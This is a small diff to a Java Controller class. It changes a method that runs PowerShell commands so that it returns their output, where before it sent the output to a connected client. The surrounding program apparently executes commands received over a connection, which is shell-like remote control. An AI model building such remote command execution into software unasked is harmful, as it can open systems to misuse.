@@ -50,12 +50,13 @@ public class Controller {
 		}
 	}
 	
-	public void execute(String command) {
+	public String execute(String command) {
 		try {
 			PowerShellResponse response = powerShell.executeCommand(command);
-			client.send(response.getCommandOutput());
+			return response.getCommandOutput();
 		} catch (Exception e) {
 			endConnection();
+			return null;
 		}
 	}
 	
